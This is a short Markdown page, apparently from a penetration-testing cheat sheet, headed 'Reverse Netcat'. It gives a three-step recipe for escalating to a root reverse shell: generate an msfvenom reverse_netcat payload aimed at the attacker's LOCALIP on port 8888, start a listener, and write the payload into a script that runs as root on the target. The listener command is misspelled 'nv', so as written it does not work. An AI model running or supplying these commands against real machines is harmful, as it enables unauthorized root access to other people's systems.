+++
title = "Examples"
+++

###### Reverse Netcat

If there is a script that can we can write to that runs as root on the target machine:

- Local: `msfvenom -p cmd/unix/reverse_netcat lhost=LOCALIP lport=8888 R`
- Local: `nv -lvp 8888`
- Target: `echo <msfvenom output> > script`
